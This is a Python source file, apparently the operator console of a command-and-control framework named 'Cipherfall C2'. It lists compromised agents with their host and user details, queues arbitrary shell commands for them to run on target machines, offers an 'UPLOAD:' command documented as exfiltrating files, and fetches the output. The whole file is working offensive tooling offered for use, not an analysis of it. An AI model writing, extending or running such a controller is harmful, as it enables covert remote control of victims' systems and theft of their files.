#!/usr/bin/env python3
"""
operator.py — Cipherfall C2 Operator CLI

Talks to the admin API on localhost (server.py). No external dependencies.

Usage:
  python3 operator.py agents
      List registered agents with last-seen time and sysinfo.

  python3 operator.py register <agent_id> [label]
      Register an agent by its ID before it can be tracked.
      Get the agent's ID on the target with:  python3 agent.py --id

  python3 operator.py tasks
      List all tasks across all agents with their current status.

  python3 operator.py task <agent_id_prefix> <command>
      Queue a shell command. agent_id can be a prefix (min 4 chars).
      Special command:  UPLOAD:/path/to/file  — exfiltrate a file (base64).

  python3 operator.py result <task_id>
      Print output of a completed task.

  python3 operator.py wait <task_id>
      Poll every 5 s until the task is done, then print output.

Environment:
  C2_ADMIN_PORT   admin API port (default: 1337)
"""

import json, os, sys, time, urllib.error, urllib.request

BASE = f"http://127.0.0.1:{os.environ.get('C2_ADMIN_PORT', '1337')}"


def _get(path: str):
    with urllib.request.urlopen(f"{BASE}{path}", timeout=5) as r:
        return json.loads(r.read())


def _post(path: str, body: dict):
    req = urllib.request.Request(
        f"{BASE}{path}",
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        return json.loads(r.read())


def _ts(epoch: int) -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(epoch))


def cmd_agents():
    agents = _get("/admin/agents")
    if not agents:
        print("  (no agents registered)")
        return
    for a in agents:
        info = json.loads(a.get("sysinfo") or "{}")
        label = f"[{a['label']}] " if a.get("label") else ""
        print(
            f"  {a['id']}  {label}"
            f"last={_ts(a['last_seen'])}  "
            f"{info.get('hostname', '-')}  "
            f"{info.get('user', '-')}@{info.get('os', '-')} {info.get('release', '')}"
        )


def cmd_register(agent_id: str, label: str = ""):
    _post("/admin/register", {"agent_id": agent_id, "label": label})
    print(f"  registered  {agent_id}  label={label!r}")


def cmd_tasks():
    tasks = _get("/admin/tasks")
    if not tasks:
        print("  (no tasks)")
        return
    for t in tasks:
        print(
            f"  {t['id']}  "
            f"agent={t['agent_id'][:8]}  "
            f"status={t['status']:<8}  "
            f"cmd={t['command']!r}"
        )


def cmd_task(agent_id_prefix: str, command: str):
    agents  = _get("/admin/agents")
    matches = [a["id"] for a in agents if a["id"].startswith(agent_id_prefix)]
    if not matches:
        print(f"  error: no agent matching '{agent_id_prefix}'")
        sys.exit(1)
    if len(matches) > 1:
        print(f"  error: ambiguous prefix '{agent_id_prefix}' → {[m[:8] for m in matches]}")
        sys.exit(1)
    r = _post("/admin/task", {"agent_id": matches[0], "command": command})
    print(f"  queued  task_id={r['task_id']}  agent={matches[0][:8]}")


def cmd_result(task_id: str):
    t = _get(f"/admin/result/{task_id}")
    print(f"  status : {t['status']}")
    print(f"  agent  : {t['agent_id'][:8]}")
    print(f"  command: {t['command']!r}")
    print(f"  output :")
    print(t.get("output") or "  (none yet)")


def cmd_wait(task_id: str):
    print(f"  waiting for {task_id[:8]}…", end="", flush=True)
    while True:
        t = _get(f"/admin/result/{task_id}")
        if t["status"] == "done":
            print(" done")
            print(t.get("output") or "(no output)")
            return
        print(".", end="", flush=True)
        time.sleep(5)


USAGE = """\
usage:
  operator.py agents
  operator.py register <agent_id> [label]
  operator.py tasks
  operator.py task   <agent_id_prefix> <command>
  operator.py result <task_id>
  operator.py wait   <task_id>
"""

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(USAGE)
        sys.exit(1)
    cmd = sys.argv[1]
    try:
        if   cmd == "agents":                               cmd_agents()
        elif cmd == "register" and len(sys.argv) >= 3:     cmd_register(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "")
        elif cmd == "tasks":                                cmd_tasks()
        elif cmd == "task"   and len(sys.argv) >= 4:       cmd_task(sys.argv[2], sys.argv[3])
        elif cmd == "result" and len(sys.argv) >= 3:       cmd_result(sys.argv[2])
        elif cmd == "wait"   and len(sys.argv) >= 3:       cmd_wait(sys.argv[2])
        else:
            print(USAGE)
            sys.exit(1)
    except urllib.error.URLError as e:
        print(f"  error: cannot reach admin API — is server.py running? ({e.reason})")
        sys.exit(1)
